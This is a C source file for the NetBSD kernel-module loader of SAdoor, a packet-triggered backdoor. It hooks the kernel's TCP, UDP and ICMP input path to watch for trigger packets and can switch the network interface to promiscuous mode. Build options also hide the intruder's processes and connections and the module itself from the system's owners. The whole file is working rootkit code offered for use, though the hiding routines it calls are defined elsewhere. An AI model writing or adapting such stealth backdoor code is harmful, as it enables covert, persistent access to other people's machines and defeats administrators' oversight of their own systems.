/*
 *  File: sadoor_lkm.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod NetBSD load/unload procedures
 *  Version: 1.0
 *  Date: Thu Jul 24 14:32:14 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/param.h>
#include <sys/ioctl.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <sys/mount.h>
#include <sys/exec.h>
#include <sys/lkm.h>
#include <sys/file.h>
#include <sys/errno.h>
#include <sys/syscall.h>
#include <sys/protosw.h>

#include "sadoor.h"

/* Global variables */
struct sa_options opt;

/* The packets generated from ../config/sadoor.pkts */
extern struct sa_pkts *packets;

/* Local functions */
static int load_module(struct lkm_table *);
static int unload_module(void);
static int loader(struct lkm_table *, int);

/* Misc module, name only */
MOD_MISC("sadoor");

/*
 * Use loader() below for loading, unloading and stating.
 */
int
sadoor(struct lkm_table *lkmtp, int cmd, int ver)
{
    DISPATCH(lkmtp, cmd, ver, loader, loader, lkm_nofunc);
}
	

/*
 * The module "main" function.
 * Calls load_module()/unload_module() below.
 */
static int
loader(struct lkm_table *lkmpt, int cmd)
{
	int err = 0;

	switch (cmd) {
	
		case LKM_E_LOAD:
			if ((err = load_module(lkmpt)))
				uprintf("Error loading module, check the logs ...\n");
			break;

		case LKM_E_UNLOAD:
			err = unload_module();
			break;

		case LKM_E_STAT:
			break;
			
		default:
			return(EIO);
			break;
	}
	
	return(err);
}

/*
 * The module load function.
 * Get the addresses of the udp, tcp and icmp input functions and
 * change the one that matches the protocol of the first packet
 * to our function (input_wrapper()).
 * Call the process/connection/module hiding function if that option
 * is set.
 */
static int
load_module(struct lkm_table *lkmpt)
{
	int s;

    /* Better safe than sorry */
    memset(&opt, 0x00, sizeof(opt));

#ifdef SAKMOD_ENABLE_REPLAY_PROTECTION
    /* Init timestamp list for replay protection */
    {
        struct timeval tv;
        debug(1, "Replay protection enabled, saving time as first timestamp\n");

        microtime(&tv);

        if (replay_add(tv.tv_sec, tv.tv_usec) != 0)
            return(EINVAL);
    }
#endif /* SAKMOD_ENABLE_REPLAY_PROTECTION */

    /* Hide processes */
#ifdef SAKMOD_HIDE_PROCS
    hide_procs();
#endif /* SAKMOD_HIDE_PROCS */

    /* Hide connections */
#ifdef SAKMOD_HIDE_CONNECTION
    hide_conns();
#endif /* SAKMOD_HIDE_CONNECTION */

    /* Wrap input function for first packet */
    s = splnet();
        opt.sao_wrapindex = PROTO2INDEX(packets->key_pkts->sa_pkt_proto);
        opt.real_input_func = INPUTADDR(opt.sao_wrapindex);
        REPLACE_INPUT(opt.sao_wrapindex, input_wrapper);

    /* Set interface in promsicous mode */
#ifdef SAKMOD_IFACE_RUN_PROMISC
        iface_promisc(SAKMOD_IFACE_RUN_PROMISC);
#endif /* SAKMOD_IFACE_RUN_PROMISC */
    splx(s);

	/* Hide module */
#ifdef SAKMOD_HIDE_MODULE
		hide_module(lkmpt);
#endif /* SAKMOD_HIDE_MODULE */

	log(1, "Up and running\n");
	return(0);	
}

/*
 * The module unload function.
 * Replace the ip_input_wrapper function with the real one.
 * Also replace any other wrapped function used to hide
 * processes and/or connection.
 */
static int
unload_module(void)
{
    int s;

    /* Restore the wrapped function */
    s = splnet();
    	REPLACE_INPUT(opt.sao_wrapindex, opt.real_input_func);

    /* Disable promisous mode */
#ifdef SAKMOD_IFACE_RUN_PROMISC
    	iface_unpromisc(SAKMOD_IFACE_RUN_PROMISC);
#endif /* SAKMOD_IFACE_RUN_PROMISC */
    splx(s);

    /* Restore process functions */
#ifdef SAKMOD_HIDE_PROCS
    hide_procs_restore();
#endif /* SAKMOD_HIDE_PROCS */

    /* Hide connections */
#ifdef SAKMOD_HIDE_CONNECTION
    hide_conns_restore();
#endif /* SAKMOD_HIDE_CONNECTION */


	log(1, "Unloaded\n");
	return(0);
}


